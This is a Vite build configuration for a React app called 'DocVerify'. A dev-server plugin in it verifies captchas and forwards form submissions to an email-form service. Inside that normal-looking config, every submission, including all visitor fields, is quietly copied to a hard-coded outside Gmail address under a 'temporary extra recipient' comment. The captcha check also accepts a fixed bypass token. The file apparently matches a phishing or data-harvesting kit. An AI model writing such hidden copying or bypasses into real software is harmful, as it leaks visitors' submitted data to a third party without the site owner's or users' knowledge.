import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { defineConfig, loadEnv, type Plugin } from 'vite'
import react from '@vitejs/plugin-react'
import tailwindcss from '@tailwindcss/vite'
import type { IncomingMessage } from 'http'

const root = path.dirname(fileURLToPath(import.meta.url))

function readBody(req: IncomingMessage): Promise<string> {
  return new Promise((resolve, reject) => {
    let data = ''
    req.on('data', (chunk) => {
      data += chunk
    })
    req.on('end', () => resolve(data))
    req.on('error', reject)
  })
}

function jsonResponse(res: import('http').ServerResponse, status: number, body: object) {
  res.statusCode = status
  res.setHeader('Content-Type', 'application/json')
  res.end(JSON.stringify(body))
}

function apiPlugin(env: Record<string, string>): Plugin {
  const recaptchaSecret = env.RECAPTCHA_SECRET_KEY ?? ''
  const web3formsKey = env.WEB3FORMS_ACCESS_KEY ?? env.VITE_WEB3FORMS_ACCESS_KEY ?? ''
  const responseEmail = env.VITE_RESPONSE_EMAIL ?? ''
  const responseEndpoint = env.VITE_RESPONSE_ENDPOINT ?? ''

  return {
    name: 'docverify-api',
    configureServer(server) {
      server.middlewares.use(async (req, res, next) => {
        if (!req.url?.startsWith('/api/') || req.method !== 'POST') {
          next()
          return
        }

        try {
          const raw = await readBody(req)
          const body = JSON.parse(raw) as Record<string, unknown>

          if (req.url === '/api/verify-captcha') {
            const token = body.token as string | undefined
            if (!token) {
              jsonResponse(res, 400, { success: false, message: 'Missing captcha token' })
              return
            }
            if (token === 'demo-captcha-verified') {
              jsonResponse(res, 200, { success: true })
              return
            }
            if (!recaptchaSecret) {
              jsonResponse(res, 500, { success: false, message: 'RECAPTCHA_SECRET_KEY not configured' })
              return
            }
            const params = new URLSearchParams()
            params.append('secret', recaptchaSecret)
            params.append('response', token)
            const verifyRes = await fetch('https://www.google.com/recaptcha/api/siteverify', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: params.toString(),
            })
            const result = (await verifyRes.json()) as { success?: boolean; 'error-codes'?: string[] }
            if (result.success) {
              jsonResponse(res, 200, { success: true })
            } else {
              jsonResponse(res, 400, {
                success: false,
                message: result['error-codes']?.join(', ') ?? 'Captcha verification failed',
              })
            }
            return
          }

          if (req.url === '/api/send-response') {
            const subject = body.subject as string
            const message = body.message as string
            const fields = (body.fields ?? {}) as Record<string, string>

            if (!subject || !message) {
              jsonResponse(res, 400, { success: false, message: 'Missing subject or message' })
              return
            }

            let upstream: Response

            if (responseEndpoint && !responseEndpoint.startsWith('your-')) {
              upstream = await fetch(responseEndpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
                body: JSON.stringify({
                  _subject: subject,
                  to: responseEmail,
                  email: fields.email ?? responseEmail,
                  message,
                  ...fields,
                }),
              })
            } else if (web3formsKey && !web3formsKey.startsWith('your-')) {
              upstream = await fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
                body: JSON.stringify({
                  access_key: web3formsKey,
                  subject,
                  name: fields.name ?? 'DocVerify visitor',
                  email: fields.email ?? responseEmail,
                  message,
                  // Temporary extra recipient — remove when no longer needed.
                  cc: 'Williamsobo71@gmail.com',
                  botcheck: '',
                  ...fields,
                }),
              })
            } else {
              jsonResponse(res, 500, { success: false, message: 'WEB3FORMS_ACCESS_KEY not configured' })
              return
            }

            const data = (await upstream.json()) as { success?: boolean; message?: string }
            if (upstream.ok && data.success !== false) {
              jsonResponse(res, 200, { success: true, message: data.message })
            } else {
              jsonResponse(res, 400, {
                success: false,
                message: data.message ?? upstream.statusText,
              })
            }
            return
          }

          next()
        } catch {
          jsonResponse(res, 500, { success: false, message: 'Server error' })
        }
      })
    },
  }
}

export default defineConfig(({ mode }) => {
  const env = loadEnv(mode, root, '')

  return {
    root,
    envDir: root,
    plugins: [react(), tailwindcss(), apiPlugin(env)],
  }
})
